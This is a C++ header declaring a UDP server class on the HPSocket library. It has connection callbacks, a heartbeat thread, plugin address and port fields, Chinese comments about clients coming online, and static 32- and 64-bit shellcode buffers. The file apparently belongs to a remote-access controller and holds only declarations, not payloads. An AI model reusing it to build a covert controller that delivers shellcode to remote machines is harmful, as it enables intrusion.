#pragma once
#include "HPSocket.h"
#include "SocketInterface.h"
#include "macros.h"
#include "Buffer.h"





typedef void (CALLBACK* NOTIFYPROC)(ClientContext*, UINT nCode);
typedef CList<ClientContext*, ClientContext* > ContextList;

class CHpUdpServer :public CHpUdpServerListener
{
public:
	CHpUdpServer(void);
	~CHpUdpServer(void);
	CUdpArqServerPtr m_UdpServer;
	NOTIFYPROC		m_pNotifyProc;
	 ContextList				m_listFreePool;
	// CRITICAL_SECTION	m_cs;
	 CLCS m_clcs;
	 HANDLE hThreadHeartWorker;
	BOOL Initialize(NOTIFYPROC pNotifyProc,  int nMaxConnections, TCHAR* ip, int nPort);
	void Send(ClientContext* pContext, LPBYTE lpData, UINT nSize);
	BOOL SendWithSplit(CONNID dwConnID, LPBYTE lpData, UINT nSize, UINT nSplitSize);
	void Shutdown();
	BOOL Disconnect(CONNID dwConnID);
	int IsOverMaxConnectionCount();
	void MovetoFreePool(ClientContext* pContext);
	static unsigned __stdcall ThreadHeartbeat(LPVOID WorkContext);
	virtual EnHandleResult OnPrepareListen(IUdpServer* pSender, SOCKET soListen);
	virtual EnHandleResult OnAccept(IUdpServer* pSender, CONNID dwConnID, UINT_PTR soClient);
	virtual EnHandleResult OnHandShake(IUdpServer* pSender, CONNID dwConnID);
	virtual EnHandleResult OnSend(IUdpServer* pSender, CONNID dwConnID, const BYTE* pData, int iLength);
	virtual EnHandleResult OnReceive(IUdpServer* pSender, CONNID dwConnID, const BYTE* pData, int iLength);
	virtual EnHandleResult OnClose(IUdpServer* pSender, CONNID dwConnID, EnSocketOperation enOperation, int iErrorCode);
	virtual EnHandleResult OnShutdown(IUdpServer* pSender);


	TCHAR m_ip[255];    //插件地址
	int m_port;			//插件端口
	CONNID pIDs[65535];//所有连接ID
	LONG m_stop;		//端口停止上线控制
	BOOL sound;			//端口上下线提示音
	int m_headerlength;		//头部数据总长度之和
	int m_maxConnection;	//最大连接数
	BOOL B_run;

static	PVOID Shellcode32;
static	int ShellcodeSize32;
static	PVOID Shellcode64;
static	int ShellcodeSize64;

};






